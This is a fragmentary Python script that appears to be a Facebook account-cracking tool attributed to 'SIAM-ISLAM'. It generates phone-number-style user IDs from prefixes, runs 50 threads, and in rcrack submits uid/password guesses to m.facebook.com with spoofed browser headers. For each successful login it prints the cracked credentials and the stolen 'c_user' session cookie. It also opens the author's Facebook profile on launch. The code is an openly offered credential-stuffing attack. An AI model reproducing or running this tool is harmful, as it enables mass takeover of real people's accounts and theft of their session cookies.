...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/profile.php?id=100093142277927&mibextid=JRoKGi/')
logo = ("""
...
def riddu():
    ...
    os.system("clear")
    print(logo)
    print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Example : {xr}019,017,016,018,013,015{x}')
    print(" \033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××")
    rk1 = '0191'
    rk2 = '0172'
    rk3 = '0165'
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m SIAM-ISLAM')
...
def rcrack(uid,pwx,tl):
    ...
    'dpr': '1.75',
    'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=AfdpNfIC8D_PfvhEAvQh2EtZQOl46e-LFAzdt2ZivHqxK0yj6rxdQ6fAlMP6oj_KjafNo-rwCP0ws_zCr_76A7V9pkxjs012AykTeBTNjVdf6w&smuh=50786&lh=Ac-YGa9e7OpYsP4y1DI&wtsid=rdr_0wSYy3zPB1AYXnkht&_rdr',
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[SIAM-OK🍁] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}siam{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
